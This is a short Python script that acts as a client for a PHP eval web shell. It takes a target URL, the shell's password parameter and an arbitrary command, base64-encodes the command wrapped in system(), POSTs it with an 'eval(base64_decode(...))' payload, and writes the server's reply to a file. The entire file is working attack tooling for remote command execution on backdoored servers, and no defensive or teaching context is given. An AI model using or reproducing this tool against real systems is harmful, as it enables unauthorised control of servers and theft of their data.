import requests
import sys
import base64

url = sys.argv[1]
password = sys.argv[2]
store_filename = sys.argv[3]
cmd = ''
x = len(sys.argv)
i = 4
while i<x:
	cmd = cmd + sys.argv[i]
	if i < x-1:
		cmd = cmd + ' '
	i += 1
cmd = "system(\"" + str(cmd) + "\");"
cmd = str(base64.b64encode(cmd.encode('utf-8')),'utf-8')
data = {password:'eval(base64_decode($_POST[\'x\']));','x':cmd}
html = requests.post(url=url,data=data)
r = html.content
with open(store_filename,'wb') as f:
	f.write(r)